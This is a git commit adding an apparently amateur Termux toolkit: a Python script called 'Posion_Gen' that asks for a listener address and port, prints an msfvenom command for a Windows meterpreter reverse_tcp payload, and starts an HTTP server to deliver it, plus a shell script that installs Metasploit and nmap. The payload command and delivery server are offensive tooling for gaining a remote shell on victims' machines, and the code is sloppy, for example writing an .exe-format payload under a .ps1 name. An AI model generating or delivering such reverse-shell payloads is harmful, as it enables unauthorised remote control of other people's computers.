89d22e037d6e7148eb6967f7f1efef763efdbf79
David Ponzi <Encom21@users.noreply.github.com>
2020-08-22 01:36:06 +0000

    Add files via upload

---
+++ NullSector.py
@@ -0,0 +1,47 @@
+#!/usr/bin/python3
+import os
+import time
+
+#To include in futuer auto gen list
+#power = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe -o met.ps1"
+#
+
+print("Hello World")
+
+print("Welcome to Posion_Gen")
+print("This script will assits in generating")
+print("msfvenom payloads on your cellphone")
+
+start = input("Would you like to start?[y/n]:")
+if start == "y":
+    print("Starting...[]:")
+    print("The following IP are...")
+    time.sleep(1)
+    os.system('ifconfig wlan0')
+    LHOST = input("What ipaddress of your deivce:")
+    LPORT = input("What port would you like to listen on:")
+    print("The IP address is set to :" + LHOST + " on port:" + LPORT)
+    print("OK now setting up the payload...")
+    gen1 = input("What would you like:[p(powershell)/e(.exe)] any other command to exit")
+
+    if gen1 == "p":
+        print("making powershell")
+        print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe -o met.ps1")
+    if gen1 == "e":
+        print("making executable application")
+        print("exe")
+
+    else:
+        print("Exiting...")
+
+    print("server is starting up pleae use http://" + LHOST + ":8000" )
+    print("Starting up the server becarefull who is on the device!....")
+    os.system("python3 -m http.server")
+
+    print("Now that the file is created would you like to start metasploit?...")
+    meta = input("[y/n]")
+    
+    print("Metasploit starting")
+
+else: 
+  print("See you soon")
---
+++ auto-install.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+#note to use git
+#pkg install git
+
+
+echo "Auto-Install"
+echo "This will install metasploit & nmap"
+
+pkg update -y && pkg upgrade -y
+
+termux-setup-storage
+
+pkg install unstable-repo -y
+
+pkg install metasploit -y
+
+pkg install nmap -y
+
+echo "Done with the install ! would you like the screen cleared?"
